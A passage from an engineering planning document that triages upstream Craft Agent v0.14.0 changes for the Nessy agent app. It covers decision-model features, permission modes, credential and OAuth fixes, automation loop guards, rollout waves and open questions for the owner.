| DEC-14 | Usage: `usage.ts`, outcome and follow-up lines, `decisions-report.ts`, the Settings "Advanced settings" toggles in 4 groups. Default on: decideTool, taskVerdicts, semanticLabels; the other 10 off. | absent | **take** | The transparency half (owner rule). Local bookkeeping only, no network, no state text. Toggles of dropped features are not shipped, and this is stated. Rotation at 10 MiB → `decisions.prev.jsonl`. | Host. | S |
| DEC-1 | The `decide` session tool (`handlers/decide.ts`, `DecideSchema`; up to 200 items and 20 questions; readOnly; safeMode allow). Hidden unless `includeDecide`. 1 s resolution cache, a decide overlay in TurnCard. | absent | **adapt** | Native check: no runtime has a typed probability classifier tool. Built once in the host via the registry, and bridged for codex. The offer condition is OQ-43.5. The docs must carry upstream's privacy warning: the agent chooses the state it sends. | **Pi:** registry. **Claude:** session MCP via `getSessionToolNames()`. **Codex:** a `HOST_CALLBACK_BRIDGE_ROUTES` entry plus the bridge, so offered only when the spawn has the bridge; its tool list is fixed at thread start, so a provider configured mid-thread reaches new threads only (stated residue). | L |
| DEC-2 | Task verdicts. `verdict-decision.ts` (`VERDICT_MIN_CONFIDENCE` 0.8, probability 0.7) via the TaskRunner `applyVerdict`/`markNodeDone` split and the optional `decide` dep. When the verifier forgot the `VERDICT:` line, the text is classified rather than re-asked. DTO `via`/`confidence`, and an "inferred" line in the TaskEditor. | `TaskRunner.ts` (UA4.1, `53b635c20`): `MAX_UNPARSED_REASKS`=2, then fail. With the deps undefined, v0.14.0 equals v0.13.4 (skeptic-verified), so nothing is lost today. | **adapt** | A Conductor seam with no runtime equivalent. Port the split onto OUR divergences (turn-scoped finalText, the armed verdict listener, the settlement gate), not the upstream file wholesale. A parseable `VERDICT` line keeps winning. The 14 upstream cases are re-based onto our MockHost. | Host; uniform (it reads the orchestrator's final text). || L (with DEC-3) |
| DEC-3 | Repair scoping. `task-repairs.ts`: one noul per subtask (0.7, up to 64 nodes). A FAIL with a reason but no named nodes repairs only the implicated nodes and their dependents. The budget is unchanged. | Whole-frontier repair on FAIL | **adapt** | It only narrows. The fallback is today's behaviour. It ships with DEC-2 because both use the same split. | Host. | S |
| DEC-4 | Turn outcome. `turn-outcome.ts` (finished / needs_input / blocked; confidence 0.7, probability 0.6; the first 800 characters of the request and the last 3000 of the reply). `applyTurnOutcome` moves an open session to `needs-review`. `buildNodeOutcomeClassifier` refuses to mark a stalled child node done. | `needs-review` exists (TaskRunner `FAILED_STATUS`; the board maps it); nothing moves a session there automatically | **adapt** | Native check: no runtime reports "awaiting the user" as a structured outcome; our backends emit only complete or error. Adapted for TRANSPARENCY: an automatic move shows its reason on the session ("set by the decision model", plus the outcome). Default off, as upstream. Posture: OQ-43.6. | Host (SessionManager turn-complete plus the TaskRunner node seam); uniform. | M |
| DEC-5 | Semantic auto-label rules: `SemanticAutoLabelRule {semantic, threshold 0.9, value, description}`, evaluator and validation, a fire-and-forget hook after each user message, `labels.md`. | regex-only `labels/auto/*` | **adapt** | Labels are a host concept. Types, validator and evaluator verbatim (rebranded). The docs state that every user message in a workspace with a semantic rule goes to the provider. Lands after R14-44, because `LabelAdd` can fire automations. | Host. | S |
| DEC-6 | Semantic automation condition: `SemanticCondition {question, threshold?}` on `AutomationMatcher`/`PendingPrompt`; `automation-condition.ts` (the event, the trigger payload, the last user and assistant messages clipped to 1500 characters; default 0.5); a "skipped" history entry. | deterministic conditions only (`automations/types.ts`) | **adapt** | Claude's prompt-type hooks are runtime hooks, not host automations, and codex has none. Deterministic conditions are evaluated first, before any network call. Only `semanticCondition` lives here: the `event`/`eventPayload` carriage belongs to R14-44. The skipped entry shows the probability. When the layer is off the run happens (upstream: null = run), and the docs say so. | Host. | S |
| DEC-7 | **Guarded** permission mode (`agent/core/guarded-mode.ts` + server-core): between Ask and Execute. Risky calls judged by three nouls at 0.8 become prompts. Writes outside cwd/plans/data always prompt. Falls back to Ask when the layer is off. Wired into Pi and Claude, not codex. | Our six-mode vocabulary (`mode-types.ts`). The model-judged slot is `auto` on all three: the Claude SDK's own auto-mode classifier, the Pi host guardian on the fast model (`core/guardian-consult.ts`), and codex's native `approvals_reviewer=auto_review`. | **drop-c** (OQ-43.4) | `auto` already fills the slot, with the runtime's own judge on Claude and Codex (native-first step 1), audit receipts and a breaker, on the user's gateway or BYO model. A seventh mode would need rows in both translation tables with no native target, plus a codex residue (no host pre-tool seam on our path). That is the silent-divergence class AGENTS.md names. Its one distinct idea, an always-prompt for writes outside cwd/plans/data, is judged separately against `auto`'s floors (OQ-43.4 (c)). | n/a (`auto` covers all three) | L if taken |
| DEC-8 | Risk badges on permission prompts (`permission-risks.ts`; six nouls at 0.75: deletes, sends, publishes, credentials, system, spends). Async, informational, buttons unchanged. | absent on the card. Codex's native `riskLevel` is shown only as a status-line suffix (`codex/event-adapter.ts`). | **adapt** | No runtime classifies risk on a normal prompt. The host's `permission_request` is the uniform seam. Where codex supplies a native `riskLevel`, show it with an honest source label and skip the classifier call. The badges must not reflow the buttons under the cursor. | Host; uniform. Codex adds its native level when auto_review ran. | M |
| DEC-9 | Smart titles (`smart-titles.ts`): `isSmallTalk` skips the AI title; `titleNoLongerFits` refreshes a stale automatic title. User-set titles are never touched. | `generateTitle` on the first message, `refreshTitle` → per-backend `regenerateTitle` | **adapt** | The host owns titles across runtimes. Net positive only with a local or nearby provider. Must honour our "user-set title" flag. | Host; the title itself is still produced per runtime. | S |
| DEC-10 | Adaptive thinking (`adaptive-thinking.ts`): a 4-level rubric lowers the thinking level before the turn, with a foreground cap of 3 s. | `thinking-levels.ts`: Anthropic uses adaptive thinking + effort natively. Pi and Codex use `reasoning_effort`. The standing policy is not to suppress gateway Qwen thinking. | **drop-c** | Claude's adaptive thinking is the runtime's own per-request mechanism, so this would duplicate it and add up to 3 s per turn. Whether gateway models honour a lowered effort is unmeasured. Reopen on a measurement. | Claude native; Pi and Codex unmeasured. | — |
| DEC-11 | Mid-turn messages (`mid-turn-messages.ts`): steer or queue chosen per message (0.7, foreground cap 3 s on the ack). `isContinuation` merges two queued messages into one replay. | Per-connection `midStreamBehavior` steer\|queue (`config/llm-connections.ts`); `sessions/mid-stream-interruption.ts` | **adapt** | No runtime chooses steer vs queue per message. A host choice over the two paths we already have. `wasInterrupted` keeps coming from the backend's answer. | Host choice. Delivery per runtime as today (codex native `turn/steer`; Pi and Claude redirect with an abort fallback). | M |
| DEC-12 | Large results (`large-results.ts`): summary vs preview chosen on the first 3000 characters, through `setLargeResultSummaryGate` (also installed in the Pi server). | `guardLargeResult` with an LLM summary (`local-tools/runtime.ts`, `runMiniCompletion`); codex truncates natively | **measure** | Worth it only if summarisation is frequent and slow on the gateway. Measure how often `guardLargeResult` summarises (on the `fast` alias). | Pi + Claude (cross-process install for the Pi subprocess); codex native, n/a. | S |
| DEC-13 | Suggestions (`suggestions.ts`): before a turn, a choice over up to 60 candidates (inactive sources, then skills) plus "none", giving a one-turn hint, with follow-up records. | Skills are already listed on every runtime: Pi via `prompt-builder` `<available_skills>`; Claude and Codex natively. Inactive sources get no hint. | **adapt (split)** | Skills half: drop-c (the premise "the agent does not see skills" does not hold here). Sources half: adapt as a host hint, with the follow-up records kept. | Host hint; uniform. | M |

### 6.B Decision-free runtime and agent fixes (S2)

| ID | Upstream behaviour | Ours | Disp. | Why | Runtimes | Size |
| --- | --- | --- | --- | --- | --- | --- |
| COR-1, COR-2, COR-3 | see §4 | | take | | | S / S / M |
| R14-12 | A Claude thinking-level change applies to the live query via `applyFlagSettings({effortLevel})` / `setMaxThinkingTokens` | `live-session.ts` hashes thinking into the live signature, so the child respawns and the change applies next turn. F1.821 uses `applyFlagSettings` only for the effort clamp. | **adapt** | The user-visible behaviour already matches; the gain is no cold respawn, via the SDK's own setter (native-first). Respawn stays as the fallback. Low priority; after R14-27. | Claude only. | S |
| R14-13 | Source-activation retry: falls back to the last user message for an attachment-only turn, appends the turn's steers, sends hidden (no duplicate message) | v0.13.4 shape: an empty capture skips the retry (stranded session), a visible duplicate, steers dropped | **take** | Decision-free. The `noteSuggestionUse` call goes with DEC-13. "Keeps thinking level" depends on DEC-10, so it is a residue. The `autoRetryPending` dedupe must keep working for remote clients. | Pi and Claude emit `source_activated`. Codex has no producer, a stated residue. | S |
| R14-24 | Pi turn with output tokens but zero text (reasoning ate the budget) | not detected. Our `coder` alias currently resolves to a deepseek flash model (`auth/nestor-model-snapshot.ts`), so the symptom is on our default Pi path. | **adapt** | Take the detection but emit a user-visible info event instead of `console.warn` (transparent). Gate on a final, non-intermediate message. | Pi detected; the same `coder` alias serves the `claude-gateway` and codex gateway cards, so UB2.5 reads each arm (notice or KEEP or residue). | XS |
| R14-25 | `guardLargeMcpToolOutput` PostToolUse returns `updatedToolOutput` before the model reads a large MCP result | Claude: the CLI's native spill-to-disk (the MCP page, section on output limits) plus the host transcript guard. Pi: the pool guards before the model. | **drop-c** | Native-first. Residue: on Claude the model gets the CLI's file pointer, not our summary. | — | — |
| R14-32 | systemPrompt preset `snapshot: true`; per-mode rows kept static | SDK 0.3.274 records by default | **measure** | Check that our append carries nothing per-turn or per-mode, since a recorded prompt freezes it until compaction. | Claude only. | XS |
| R14-33 | Pi `queryMiniModel` falls back on a utility-model rejection to cheap models, then the session model, then provider defaults | no `queryMiniModel`: our `queryLlm` (`pi-agent-server/src/index.ts` ≈L3060) already loops over `fallbackCandidates` (`pi/gpt-5-mini`, `config.miniModel`, the summarisation default), retrying only on `isModelNotFoundError` | **adapt** onto `queryLlm` | Take the wider rejection classifier and the two extra candidates. Our Pi receives resolved ids: gateway candidates resolved by alias at call time (`resolveGatewayFastModelId`/`resolveGatewayCoderModelId`). Low priority (the ChatGPT card is flag-off). | Pi only; Claude and codex titles use their own paths (stated residue). | S |
| R14-45 | Turn context travels as a `turnContext` parameter, not inside the message | We append the same notice to the effective message, not the stored one | **drop-c** | No user-visible difference. Upstream's seam carries DEC-13's hint, so revisit with DEC-13. | — | — |
| H5 | Claude `/compact` answering `result(success)` with no manual boundary → `compaction_failed` | No Claude arm. An Accept & Compact plan could stay pending forever. | **measure** | Measure on 2.1.274 with a too-small conversation. Then port the correlation, or treat it like F1.856 (nothing to compact). | Claude only. | S |
| H7 | Pi provider-level pre-stream retries `{maxRetries:2, maxRetryDelayMs:60000}` | `SettingsManager.inMemory` already ours. The agent-level ladder is 15 s × 5; no provider block. | **measure** | Stacking retries under our ladder against the Nestor per-minute limiter needs a reading of whether pi-ai honours the gateway's `retry-after`. BYO may benefit. | Pi only. | S |
| H8 | Developer context: git root, branch, upstream, dirty counts, a changed-file sample (700 ms timeout, sanitised), with stable and volatile parts | absent. Claude gets git status from its own preset (`excludeDynamicSections`). | **adapt** | Native-first: Claude native. One host producer for Pi. Codex needs a source read of openai/codex environment context (hypothesis: no branch/status) before choosing host or residue. Keep the stable/volatile split and the timeout. | Claude native; Pi host; Codex after a read. | M |
| H52 | `steering-sdk.test.ts`: an offline pin that the Pi SDK batches steers at one model boundary | no equivalent | **take** | Cheap guard for the next Pi lift (F1.244 relies on the batching). | Pi | XS |
| H26 | web_search/web_fetch schemas built with pi-ai's TypeBox, so `'5'` is coerced | `@sinclair/typebox` import on Pi 0.85.1 | **take** after one numeric-string call is measured | Same Pi version as upstream. | Pi | XS |
| H25 | ChatGPT web search follows the active model (candidates, rejection classifier) | `DEFAULT_SEARCH_MODEL = 'gpt-5.3-codex'` (retired upstream) | **take** | A total search outage the day the ChatGPT card flips on. | Pi | S |

### 6.C Permissions (S2) beyond §4

| ID | Upstream behaviour | Ours | Disp. | Why | Runtimes | Size |
| --- | --- | --- | --- | --- | --- | --- |
| SEC-1…SEC-6 | see §4 | | | | | |
| R14-06 | `allowedWritePaths` honoured in Ask (#1065), Windows glob normalisation | the key is parsed but read by no mode (F1.1050); default prompts every write outside the acceptEdits roots | **owner-question** (OQ-43.7) | It widens what runs without a card, so it is a posture. Native check: Claude `Edit(path)` allow rules exist, but our PreToolUse prompts regardless on the Claude arm. | Pi and Claude: host gate. Codex: `writable_roots`, or a residue. | S |
| R14-07 | Ask runs read-only MCP tools without prompting | F1.526/UA9.1 `evaluateMcpToolPolicy` | **drop-c** | Already ours. | — | — |
| R14-35, R14-36, R14-37 | setPermissionMode rejects unknown modes; win32 glob normalisation; spawn_session parent clamp | F1.800; P3.128; F1.549 | **drop-c** | Already ours. | — | — |
| H34 | Explore `blockWithReason continue:true` | U1 of the 0.11.4 plan | **drop-c** | Already ours. | — | — |

### 6.D Sources, auth, connections

| ID | Upstream behaviour | Ours | Disp. | Why | Runtimes | Size |
| --- | --- | --- | --- | --- | --- | --- |
| R14-16 | `api-auth.ts`: one header builder shared by api-tools, credential-manager and source-test. A multi-header JSON credential on a single-header source is unpacked. source_test shows the API error body on 400/401/403. | `credential-manager.ts` returns raw JSON when `headerNames` is unset, so `api-tools.ts` sends `{"x-goog-api-key":"…"}` as the value. `source-test.ts` builds headers its own way. | **take** | Same bug; one builder removes the drift. Never log values (F1.311). | Host sources; all three. | M |
| R14-17 | source_test refreshes or fails "Stored credential missing or expired" instead of passing an unauthenticated probe | `source-test.ts` falls through to the basic test, so a 401/403 reads as reachable | **take** | A green source that fails every call. | Host; all three. | S |
| R14-18 | RFC 8707 `resource` from RFC 9728 metadata on authorize, token and refresh; dropped on `invalid_target`; `oauth.resource` for API sources | `resource` sent only with explicit `mcp.oauthResource`. RFC 9728 discovery exists, but its resource is not propagated. | **adapt** | Resource-bound MCP servers reject every token otherwise. The `invalid_target` fallback is the control. | Host OAuth; all three. | M |
| R14-20 | Connection test with a masked key resolves the stored key by `connectionSlug` server-side | `rpc/llm-connections.ts` tests the bullets | **take** | Wrong result on every edit-and-test. The key never reaches the renderer. | Host; all BYO and gateway cards. | S |
| H20 | `refreshModelsInBackground` after ChatGPT/Copilot re-auth; headless `getSetupNeeds(authState, isSetupDeferred())` | no refresh; no deferred flag | **take** | A stale model list after an account switch; headless re-enters onboarding on every reload. | Host | XS |
| H21 | `preferredRank`: a deprecated id that normalises to its replacement ranks unranked | the old `findPreferredIndex`; a retired snapshot inherits rank 0 | **take** | New Pi BYO Anthropic/Bedrock connections can default to a retired snapshot. | Pi BYO | S |
| R14-48 | DeepSeek `deepseek-v4-flash` → `deepseek-flash` (vendor alias retired; migration) | production code: `config/llm-connections.ts` L1781 (`PI_PREFERRED_DEFAULTS`) and L1852 (`PI_MINI_PREFERRED_DEFAULTS`); the `tgpt/deepseek-v4-flash-0731` gateway ids are unrelated aliases | **adapt** | Confirm the vendor fact on DeepSeek's models list during the row (evidence is upstream's note only), then rename and migrate. | Pi BYO | XS |
| H24 | Moonshot global/CN presets, Kimi K3 defaults, labels, icons | none | **owner-question** (OQ-43.9) | New CN endpoint presets are a posture choice. | Pi BYO | XS |
| R14-21 | Config-dir path audit (#1062) | Already centralised (U43-SEC.6: `git grep` with a positive control at `config/paths.ts`). | **drop-c** (ours) | Upstream's audit did NOT touch `EditPopover.tsx`: its only v0.14.0 hunk there rewords the auto-rules prompt for semantic rules (DEC-5), and v0.14.0 still hard-codes 13 `~/.craft-agent/` strings; `APP_ROOT` is used in neither renderer. Our 13 hard-coded `~/.nessy-agent/` prompt strings are an own-Nessy row (UB4.7) with no upstream source; the renderer has no config-dir source at HEAD, so the row names one after reading or states a residue. Also a stated, not-a-row residue: `prompts/system.ts` `getUserGlobalContextDirectory` reads `~/.nessy-agent` even under `NESSY_CONFIG_DIR` (read-only, mirrors `~/.claude`). | Prompt text | XS (UB4.7) |
| R14-15 | MCP pool parallel connect with warnings | ours is parallel, with a connection verdict | **drop-c** | | | |
| R14-19 | Slack legacy relay on thecraftagents.com | none | **drop-a** | | | |

### 6.E Automations and labels

| ID | Upstream behaviour | Ours | Disp. | Why | Runtimes | Size |
| --- | --- | --- | --- | --- | --- | --- |
| R14-44 | Automation loop guard: `automationLoopGuard`, `MAX_AUTOMATION_CHAIN_DEPTH` 3, `triggeredBy.automationId/depth`, a "skipped" history row, a docs bullet | none (a positive-controlled `git grep`). A `LabelAdd` matcher that labels its own session can re-fire. | **adapt** | **Stated divergence (the target):** upstream's `PromptHandler` sets `event`/`eventPayload` only under a `semanticCondition`, so its guard protects only those matchers (skeptic). Our `PendingPrompt` carries neither field at HEAD; the row makes `buildPendingPromptsForMatchers` always set them. The controls go through our real paths: `PromptHandler` and the missed-run catch-up sweep (`runMissedRunSweep`), each → `buildPendingPromptsForMatchers` → the `onPromptsReady` closure in `SessionManager.ts` → `executePromptAutomation` (upstream's `runReadyPrompts` does not exist in ours). The docs bullet describes our code. Lands before DEC-5/DEC-6. | Host; runtime-neutral. | M |
| DEC-5, DEC-6 | see 6.A | | | | | |

### 6.F Prompt

| ID | Upstream behaviour | Ours | Disp. | Why | Size |
| --- | --- | --- | --- | --- | --- |
| SEC-7 (H9) | see §4 | | take | | S |
| H10 | Date line: "use this as the current now … Do not override explicit dates in the user's message, source data, files, or tool results" | `prompts/system.ts` L299: "ALWAYS use this as the authoritative current date/time. Ignore any other date information." (read at `8faf46cd1`) | **take** | Our line tells the model to ignore dates in files and tool results. | XS |
| H11 | system.ts rewrite, `project_context_files`, automation guidance | our own composition; native instruction loading; UA1.2, UA4.10 | **drop-c** | Only H9 and H10 carry over. | — |

### 6.G Renderer and Electron

| ID | Upstream behaviour | Ours | Disp. | Why | Size |
| --- | --- | --- | --- | --- | --- |
| R14-23 | Browser pane teardown: ids captured at creation, every step guarded so `instances.delete` always runs | an unguarded `cdp.detach()`, and popup ids read on a closed window | **take** | "Object has been destroyed" until restart. | S |
| H13 | Workspace avatars: deterministic hue initial; colour-override atom with no setter | absent; a muted initial | **adapt** | Parity, cosmetic. Take the override atom only if a setter row exists (key `nessy-workspace-avatar-colors`). | S |
| H14 | i18n sweep | done, except `components/ui/dialog.tsx` sr-only "Close" and `AutomationMenu.tsx` "Send to Workspace" | **take** (two keys, en+ru) | English in the Russian UI. | XS |
| H12 | Composer stays in the visible area (input-viewport, composer-height) | fixed `inputMaxHeight`; webui dormant | **measure** (Electron at 150–200 % zoom, short window); webui drop-c | The reported bug is mobile web. | S |
| H33 | Windows: `CLAUDE_CODE_GIT_BASH_PATH` from config in `buildClaudeSubprocessEnv`; `ChatPage` `isAbsolutePath` for `C:\` previews | Electron seeds the env (headless does not); `ChatPage` checks `/` and `~/` only | **take** (ChatPage) + state or fill the headless residue | We ship Windows. | XS |
| H28 | Update handoff: `performQuitCleanup` before `quitAndInstall`, so `before-quit` never `preventDefault`s Squirrel's quit; relaunch on failure | `quit-finalizer.ts`: preventDefault, then re-quit. The packaged rehearsal never ran (1.22.0 tracker). | **measure** (OQ-43.11) | A silently never-installing update. Adopt upstream's hook only if the update stays downloaded-but-not-installed. | M |

### 6.H SDK and dependency lifts

| ID | Upstream | Ours | Disp. | Why |
| --- | --- | --- | --- | --- |
| R14-27 | Claude Agent SDK 0.3.258 → 0.3.280 (CC 2.1.280) | both self-reports 2.1.274; `packages/shared` 0.3.274 | **measure** | Artifactory-only, after the 14-day mirror. On the bump: both self-reports plus the lockfile platform entries; full gates (dependency-lock risk trigger). |
| R14-28 | Pi 0.85.1 → 0.87.1 (`systemPrompt` read-only in 0.87) | 0.85.1. Our override already uses `before_agent_start`, so upstream's #648 rewrite is not needed. | **measure** | Artifactory-only. Provenance checks ("Unsupported Pi runtime" traps), `electron:build:servers`. |
| R14-26 | rtk: `RTK_MIN_SAFE_VERSION` 0.44.0 (older rtk corrupts grep/wc/read output); `command`/`builtin` bypass; `rtkExcludeCommands`; a prompt hint; an outdated dialog and Settings state | floor 0.23.0; exclude hard-coded `[]` in claude-agent and pi-agent; no bypass, hint or UI | **adapt** | Correctness: with rtk 0.23–0.43 the agent reads corrupted output. New StoredConfig key `rtkExcludeCommands`. Installer per OQ-43.8. **Pi and Claude** (host rewrite); **Codex:** rtk not wired, a residue. Size M. |

### 6.I Already ours, Craft-only, or not applicable (recorded so nothing is re-read)

| IDs | Disposition | Note |
| --- | --- | --- |
| H1 (keep-alive), H3 (steer queue), H4 (context occupancy), H6 (retry progress), H27 (Pi credential/bundle), H29 (lock identity), H30 (empty tool_calls), H31 (%20 links), H32 (rich-text input), H35 (archive_session, codex-bridged), H36 (send_agent_message verdict), H37 (automation Test), H41 (turn-utils), H42 (queue ordering), H44 (rtk channels), R14-29 (Opus 5.5 rows), R14-30 (error cards), R14-31 (todo tools env), R14-34 (bridge-mcp removal; session-mcp-server stays for codex), R14-41 (UA12.35), R14-42 (UA12.36/UA12.40) | drop-c / KEEP | ours, cited by the readers (F-rows, U-rows, UA rows) |
| H22 (Opus 4.6 restore), H23 (SDK uplifts), H39 (upstream release-note files), H40 (packaging churn, the feed URL and domain) | drop-c / drop-a | decided earlier, ours is ahead, or Craft's |
| H39 (the loader reads only `X.Y.Z.md`, 0.13.2), H40 (macOS `NSLocalNetworkUsageDescription`, 0.11.0 #938) | KEEP | ours: F1.254 (a) in `release-notes/index.ts`; `electron-builder.yml` L157 pinned by `macos-usage-descriptions.test.ts` |
| RN14-1 (0.14.0 release note: "Always Allow" on file writes and API calls now works) | KEEP, ours narrower | upstream keys a file write by folder (`getFileWriteRememberKey`, `write:<dirname>`); ours keys per path and API calls per exact method and path (D1.306), reason (b)/(c); the folder key is not adopted |
| R14-03, R14-09, R14-46, R14-47 | no such items | id gaps in the rest-0-14 reader's numbering: its StructuredOutput (`rest-0-14-items.json`, 44 items) and its transcript contain none of them (control: R14-01 and R14-48 are found in the same transcript) |
| H11 | drop-c | §6.F |
| H15 (de/es/hu/ja/pl/zh-Hans) | drop-c | locale set is en+ru |
| H16 (domain move, docs proxy), R14-19 (Slack relay) | drop-a | Craft services |
| H17 (dead builtin-sources seam) | adapt, lowest priority | delete the stub (`sources/builtin-sources.ts` and its three importers, `isBuiltin`); behaviour-neutral |
| H18 (messaging), H19 (Copilot) | drop-b | OQ-43.10 |
| U43-SEC.6 (config-dir audit) | drop-c | §6.D R14-21 |

### 6.J Routed to existing 1.42.0 rows (not re-owned)

| Item | Row | Note for the row |
| --- | --- | --- |
| R14-38, H2 (background chip lifecycle, phantom wake, `launchedHere`/`toolUseId`) | UA12.18 | Take the v0.14.0 event-adapter creation side (`task_started`/`task_updated` → `shell_backgrounded`), because our 2.1.274 CLI's new background wordings are not matched by `tool-matching.ts`. Port the sidechain filter as `== null`, never `=== null`. |
| R14-39 (tool heartbeat) | UA12.39 (MEAS) | |
| R14-40 (path relativise) | UA12.38 | |
| R14-43 (listener snapshot) | UA12.37 | Pin on SessionManager itself, not TaskRunner.test. |
| H45 (transfer timeout) | UA12.17 | |
| H38 (`transform-data.test.ts` dev-mode pin) | UA12.29 | Fold in; delete-then-assign (Bun env trap). |

If any of these rows is still open at the 1.42.0 close-out, the 1.43.0 plan carries it by pointer.

## 7. Proposed shape (draft, for the plan author)

1. **Now, in the active 1.42.0 plan (AGENTS.md, not an owner question).** UA12.* CRITICAL rows for SEC-1, SEC-2, SEC-3 and SEC-4 (paired in one lane: same module family), then SEC-5 once driven. COR-1 and COR-2 stay 1.43.0 rows and become CRITICAL only if their measurements confirm wrong user-facing behaviour.
2. **Wave 1: decision-free fixes.**
   - SEC-6, SEC-7, SEC-9, COR-3;
   - R14-13, R14-16 + R14-17 (same file), R14-18, R14-20, R14-23, R14-24, R14-44;
   - H10, H14, H20, H21, H25, H26, H33, H52, R14-21, R14-48.
3. **Wave 2: measurements.** R14-32, H5, H7, H12, H28 and DEC-12, each closing as a result row or spawning a take row.
4. **Wave 3: decisions, if OQ-43.2 is not (e).**
   - DEC-0 + DEC-14 + DEC-15 (core, usage, providers);
   - DEC-2 + DEC-3 + the DEC-4 node half (the Conductor trio);
   - DEC-5 + DEC-6, after R14-44;
   - DEC-8;
   - DEC-1 (per OQ-43.5), DEC-9, DEC-11, DEC-13 sources half;
   - the DEC-4 session half, per OQ-43.6.
5. **Wave 4: parity polish.** H8, H13, H17, R14-12 (after R14-27), R14-26, R14-33, OQ-43.9's (a).
6. **SDK lifts** (R14-27, R14-28) land whenever the Artifactory mirror allows, with the full gate set (risk trigger).
7. **Close-out** per AGENTS.md: version in both `package.json` files, a NEW `release-notes/1.43.0.md`, docs-site pages (decisions, permissions remember-key, automations loop guard, labels), and the CDP checklist cases.

**Live cases owed (draft).** These are the drivable ones for the packaged sitting:
- the remember-key negatives;
- a sed/sort/gh refusal;
- the Claude plan-accept transcript (COR-1);
- Stop on turn 2 (COR-2);
- `/compact` plus a message on Pi (COR-3);
- the automation loop guard;
- a Laya-less decisions card that tests "not configured" honestly;
- a Laya-backed verdict inference, if the owner runs Laya (otherwise MEAS-OWED).

## 8. Open questions for the owner (defaults taken unless the owner says otherwise; owner rule 2026-09-05)

| # | Question | Options | Default |
| --- | --- | --- | --- |
| ~~OQ-43.1~~ | Withdrawn 2026-10-02 (critic): where a CRITICAL security finding runs is answered by AGENTS.md (Editing Rules), not by the owner. SEC-1…SEC-4 are owed as UA12.* rows now, SEC-5 on confirmation (§4). | — | — |
| **OQ-43.2** | Which decision-model provider is acceptable? The Jev wire is a classifier API that neither the gateway nor any BYO chat connection serves. **Owner answer required; the controller takes no default.** | (a) Local Laya + custom only (no egress from the app; the user runs `laya-serve`; the multilingual checkpoint covers Russian per its README). (b) A "Nessy Gateway" preset, which needs a route the gateway does not serve today. (c) Also the SaaS presets TypeSafe / OpenRouter / Vercel (user messages, tool arguments and prompt text to a new third party). (d) Emulate over chat completions on `fast` (invented: uncalibrated, slow, uses quota). (e) Do not adopt the subsystem in 1.43.0. | **Recommended (a).** (b) is the ⛔ follow-up row UB6.18, opened when the gateway team publishes the route and its contract; no preset or probe code before that. SaaS dropped under (b) security/egress. (d) not recommended. |
| **OQ-43.2b** | Under (a): does the app show upstream's Laya `installHint` (`pip install "laya[serve]" && laya-serve`) and its `docsUrl` (`github.com/NandhaKishorM/laya`), and where may Laya and its weights come from? The checkpoint licence is UNVERIFIED beyond the README. **Owner answer required; the controller takes no default.** | (a) No installer command, no external docs link; the card links our own `decisions.md`. (b) Show both verbatim. (c) Show an internal source (an Artifactory mirror of the package and weights) once one exists. | **Recommended (a)**, as OQ-43.8 (b). Under (a) a Laya-backed live case can PASS only if the owner also names a source the controller may install from; otherwise those Phase 6 feature rows do not ship (plan Sequencing). |
| OQ-43.3 | Which destination does Pi's PermissionRequest suggestion carry (SEC-2)? | (a) The narrow key at `localSettings`, which is what the dialog's Always writes on Pi, with an exact echo required, destination included. (b) Session only, refusing an echo at another destination. (c) Both entries. | **(a)**. The suggestion then equals the dialog option, which is what the hooks page says an echo means. |
| OQ-43.3b | Adopt upstream's grown `DANGEROUS_COMMANDS` verbatim (SEC-1)? `git branch`, `stash`, `tag`, `clean`, `restore` and `switch`, kubectl/helm/terraform mutations, `*publish` and the deploy CLIs then always ask and are never remembered. | (a) Verbatim. The listing forms (`git branch --list`, `git stash list`, `git tag -l`) stay card-free because the allowlist is consulted first. (b) Keep our 4 pairs and rely on the exact-argv and destructive-word key rules. (c) Upstream's list minus the git listing verbs. | **(a)**. Parity and the security direction. |
| OQ-43.4 | Does upstream's "guarded" mode join our six modes? | (a) No: `auto` fills the slot with the runtime's own judge on all three; drop (c). (b) Add a seventh mode (both translation tables with no native target, a new clamp position, a codex residue). (c) Keep six modes, but borrow Guarded's always-prompt for writes outside cwd/plans/data into `auto`, as its own row after reading `auto`'s floors. | **(a)**. (c) only if a reading shows `auto` lacks that floor. |
| OQ-43.5 | How is the `decide` tool offered? Upstream hides it until the layer is on; our rule is "nothing is gated". | (a) Offered only while a provider is configured: a stated capability condition, like a connected source, with a Settings diagnostic. (b) Always offered, failing closed with "decision model not configured" (it costs schema tokens and invites useless calls). (c) Not shipped; host features only. | **(a)**, with the reason written in `tool-defs.ts` and the docs. |
| OQ-43.6 | Turn outcome moves a session to Needs Review on a model guess, which moves board columns and can fire `SessionStatusChange` automations. Is that acceptable? | (a) Yes, default off as upstream, with a visible reason on the session. (b) Only the Conductor node half (refuse to mark a stalled child done), never a chat session's status. (c) Neither. | **(a)** |
| OQ-43.6b | Which decision features first, if a provider is accepted? | (a) Core + usage, then the Conductor trio, then semantic labels and conditions (after R14-44), then risk badges, then titles / mid-turn / source suggestions. (b) Core + the `decide` tool first. (c) Core only, with features after a usage measurement. | **(a)**. Adaptive thinking and the skills half of suggestions are dropped; large results waits for a measurement; Guarded per OQ-43.4. |
| OQ-43.7 | Honour `allowedWritePaths` in default (Ask) mode (#1065)? | (a) In default only, never in plan (parity; documented in permissions.md). (b) Keep it dead and document Claude-style `Edit(path)` allow rules instead. (c) Remove the knob from the schema. | **(a)**. A user-configured allowlist, parity; plan stays read-only (F1.1050). |
| OQ-43.8 | The rtk outdated dialog offers a GitHub `curl … \| sh` installer. Show it on T-Bank machines? | (a) Port verbatim. (b) Port the floor, the Settings notice and the dialog, naming only the minimum version ("update rtk the way you installed it"). (c) Settings notice only. | **(b)**. The safety floor (an outdated rtk is never used) does not need the installer. |
| OQ-43.9 | Moonshot AI global (`api.moonshot.ai`) and CN (`api.moonshot.cn`) BYO presets? | (a) Labels, icons and the Kimi K3 defaults only, no new preset URLs. (b) Full parity including both presets. (c) Drop the hunk. | **(a)**. A new CN endpoint preset is a posture choice the plan should not make quietly. |
| OQ-43.10 | Messaging bridges (Telegram/WhatsApp) and GitHub Copilot sign-in were never imported. | (a) Keep both dropped and recorded. (b) Open a review for messaging. (c) Open a review for a Copilot BYO card. | **(a)** |
| OQ-43.11 | Who runs the update-handoff rehearsal (H28, `scripts/verify-update-feed.mjs`, a packaged install over a running app)? | (a) The controller, unsigned, in the 1.43.0 close-out sitting. (b) The owner, on a signed build. (c) Defer again. | **(a)**, with the signed-build confirmation left to the reviewer as today. |
